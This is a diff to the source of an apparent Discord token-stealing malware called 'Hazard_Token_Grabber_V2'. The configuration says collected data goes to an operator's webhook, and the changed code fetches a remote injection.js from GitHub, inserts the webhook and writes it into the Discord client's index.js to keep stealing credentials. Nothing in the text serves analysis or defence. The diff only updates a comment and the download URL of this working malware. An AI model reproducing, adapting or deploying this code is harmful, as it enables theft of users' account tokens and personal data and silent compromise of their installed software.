@@ -50,7 +50,7 @@ except:
 
 
 config = {
-    # Replace YOUR_WEBHOOK_HERE with your own webhook. The collected data will be sent to this webhook. 
+    # Replace YOUR_WEBHOOK with your own webhook. The collected data will be sent to this webhook. 
     'webhook': "YOUR_WEBHOOK_HERE",
     # Set to False if you don't want it to kill programs such as discord upon running the exe.
     'kill_processes': False,
@@ -234,7 +234,7 @@ class Hazard_Token_Grabber_V2(functions):
                                         inj_path+'initiation', exist_ok=True)
                                 except PermissionError:
                                     pass
-                            f = httpx.get('https://raw.githubusercontent.com/Smug246/Luna-Token-Grabber/main/injection.js').text.replace("%WEBHOOK%", self.webhook)
+                            f = httpx.get('https://raw.githubusercontent.com/Smug246/luna-injection/main/injection.js').text.replace("%WEBHOOK%", self.webhook)
                             try:
                                 with open(inj_path+'index.js', 'w', errors="ignore") as indexFile:
                                     indexFile.write(f)
